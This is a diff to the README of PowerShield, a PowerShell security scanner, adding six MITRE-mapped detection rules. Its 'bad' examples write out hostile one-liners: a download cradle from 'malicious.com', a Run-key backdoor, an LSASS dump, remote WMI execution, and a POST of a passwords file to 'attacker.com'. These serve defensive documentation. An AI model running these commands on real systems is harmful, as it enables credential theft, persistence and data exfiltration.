@@ -2,13 +2,27 @@
 
 ![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/J-Ellette/PowerShellTestingSuite/powershell-security.yml?branch=main)
 ![License](https://img.shields.io/github/license/J-Ellette/PowerShellTestingSuite)
-![Version](https://img.shields.io/badge/version-1.1.0-blue) <br>
+![Version](https://img.shields.io/badge/version-1.2.0-blue) <br>
 [![PowerShield - PowerShell Security Analysis](https://github.com/J-Ellette/PowerShellTestingSuite/actions/workflows/powershell-security.yml/badge.svg)](https://github.com/J-Ellette/PowerShellTestingSuite/actions/workflows/powershell-security.yml) <br>
 ![Static Badge](https://img.shields.io/badge/Language-PowerShell-blue) ![Static Badge](https://img.shields.io/badge/Language-TypeScript-blue)
 
 > **📢 Rebranded from PSTS:** PowerShell Testing Suite (PSTS) is now **PowerShield**. All references, configuration files, and outputs have been updated. See [Migration Guide](docs/MIGRATION_GUIDE.md) for details.
 
 **PowerShield** is a comprehensive security analysis platform for PowerShell scripts that integrates with GitHub Actions, provides AI-powered auto-fixes, and offers multiple deployment options.
+
+## ✨ What's New in v1.2.0
+
+### 🛡️ Advanced Attack Detection (6 New Rules)
+- **Rule 47: PowerShell Obfuscation Detection**: Detects Base64 encoding, string concatenation, character code conversion, format string obfuscation, and string reversal techniques
+- **Rule 48: Download Cradle Detection**: Identifies download-and-execute patterns including IEX with WebClient, BitsTransfer chains, and reflective assembly loading
+- **Rule 49: Persistence Mechanism Detection**: Detects registry Run keys, scheduled tasks, WMI event subscriptions, and PowerShell profile modifications
+- **Rule 50: Credential Harvesting Detection**: Identifies Mimikatz patterns, LSASS dumping, browser credential extraction, and WiFi password dumping
+- **Rule 51: Lateral Movement Detection**: Detects remote WMI/CIM execution, PSRemoting, SMB enumeration, and Pass-the-Hash techniques
+- **Rule 52: Data Exfiltration Detection**: Identifies DNS tunneling, HTTP POST uploads, cloud storage transfers, and data compression patterns
+
+**Total Security Rules**: 52 (up from 46)  
+**MITRE ATT&CK Coverage**: All rules mapped to MITRE ATT&CK framework  
+**Comprehensive Documentation**: New [Advanced Attack Detection Guide](docs/ADVANCED_ATTACK_DETECTION.md) with remediation guidance
 
 ## ✨ What's New in v1.1.0
 
@@ -34,9 +48,10 @@
 
 ### Phase 1: GitHub Workflow Integration ✅
 - **Automated Security Analysis**: Runs on every push and pull request
-- **16 Security Rules**: Comprehensive PowerShell security coverage
+- **52 Security Rules**: Comprehensive PowerShell security coverage
   - **Core Rules (4)**: Insecure hashing, credential exposure, command injection, certificate validation
-  - **PowerShell-Specific Rules (12)**: Execution policy bypass, unsafe remoting, version downgrades, privilege escalation, and more
+  - **PowerShell-Specific Rules (42)**: Execution policy bypass, unsafe remoting, version downgrades, privilege escalation, and more
+  - **Advanced Attack Detection (6)**: Obfuscation, download cradles, persistence, credential harvesting, lateral movement, data exfiltration
 - **SARIF Output**: Integrates with GitHub Security tab
 - **AI-Powered Auto-Fix**: Automatically generates and applies security fixes with multiple AI providers
 - **Configuration System**: Flexible YAML-based configuration with hierarchical support
@@ -352,6 +367,137 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 - **Constrained Mode**: Detects patterns breaking constrained language mode
 - **Unsafe File Inclusion**: Identifies dot-sourcing of untrusted scripts
 - **PowerShell Web Requests**: Detects unvalidated web requests
+
+### 47-52. Advanced Attack Detection Rules 🛡️ NEW
+
+#### 47. PowerShell Obfuscation Detection
+**Severity**: Critical  
+**MITRE ATT&CK**: T1027, T1027.010, T1059.001  
+**Description**: Detects obfuscation techniques used to hide malicious code
+
+**Patterns Detected**:
+- Base64 encoded commands (`-EncodedCommand`, `FromBase64String`)
+- Excessive string concatenation (5+ operations)
+- Character code conversion (multiple `[char]` casts)
+- Format string obfuscation (5+ placeholders)
+- String reversal (`ToCharArray`, `Reverse`)
+
+**Example**:
+```powershell
+# ❌ Bad - Base64 encoded malicious command
+powershell.exe -enc "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
+
+# ✅ Good - Clear, readable code
+Invoke-WebRequest -Uri "https://example.com"
+```
+
+#### 48. Download Cradle Detection
+**Severity**: Critical  
+**MITRE ATT&CK**: T1105, T1059.001, T1204.002  
+**Description**: Detects download cradles that fetch and execute remote code
+
+**Patterns Detected**:
+- `IEX (New-Object Net.WebClient).DownloadString(...)`
+- Web requests piped to IEX
+- BitsTransfer followed by execution
+- Reflective assembly loading from web
+
+**Example**:
+```powershell
+# ❌ Bad - Download and execute without disk access
+IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
+
+# ✅ Good - Download with validation
+$script = Invoke-WebRequest -Uri "https://trusted.com/script.ps1"
+# Review content before execution
+```
+
+#### 49. Persistence Mechanism Detection
+**Severity**: Critical  
+**MITRE ATT&CK**: T1547.001, T1053.005, T1546.003  
+**Description**: Detects persistence techniques that survive reboots
+
+**Patterns Detected**:
+- Registry Run key modifications
+- Scheduled task creation
+- WMI event subscriptions
+- PowerShell profile modifications
+- Startup folder changes
+
+**Example**:
+```powershell
+# ❌ Bad - Creates persistence via registry
+New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"
+
+# ✅ Good - Use legitimate installation methods
+# Install through proper package management
+```
+
+#### 50. Credential Harvesting Detection
+**Severity**: Critical  
+**MITRE ATT&CK**: T1003.001, T1003.002, T1555.003  
+**Description**: Detects credential theft and password dumping
+
+**Patterns Detected**:
+- Mimikatz keywords and patterns
+- LSASS process dumping
+- Browser credential extraction
+- WiFi password dumping
+- Registry hive extraction (SAM, SYSTEM)
+
+**Example**:
+```powershell
+# ❌ Bad - Dumps LSASS memory
+Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp\lsass.dmp
+
+# ✅ Good - Use proper credential management
+$cred = Get-Credential
+# Use SecureString for credentials
+```
+
+#### 51. Lateral Movement Detection
+**Severity**: Critical  
+**MITRE ATT&CK**: T1021.006, T1021.002, T1047  
+**Description**: Detects techniques to spread across networks
+
+**Patterns Detected**:
+- Remote WMI/CIM execution
+- Remote scheduled tasks
+- SMB share enumeration
+- PSRemoting with credentials
+- Pass-the-Hash techniques
+
+**Example**:
+```powershell
+# ❌ Bad - Remote execution without proper authorization
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName "target-server"
+
+# ✅ Good - Use authorized remote management
+Enter-PSSession -ComputerName "authorized-server" -ConfigurationName "RestrictedEndpoint"
+```
+
+#### 52. Data Exfiltration Detection
+**Severity**: Critical  
+**MITRE ATT&CK**: T1048.003, T1041, T1567.001  
+**Description**: Detects data exfiltration to external locations
+
+**Patterns Detected**:
+- DNS tunneling (DNS queries in loops)
+- HTTP POST with large data
+- Pastebin/GitHub Gist uploads
+- Cloud storage uploads (Dropbox, S3, Azure Blob)
+- Email with attachments
+- Data compression before upload
+
+**Example**:
+```powershell
+# ❌ Bad - Exfiltrates data to external site
+$data = Get-Content "C:\Sensitive\passwords.txt"
+Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $data
+
+# ✅ Good - Use authorized data transfer methods
+# Transfer data through approved channels with proper logging
+```
 
 For detailed examples of all rules, see the [test scripts](tests/TestScripts/) organized by category:
 - [PowerShell-specific rules](tests/TestScripts/powershell/)
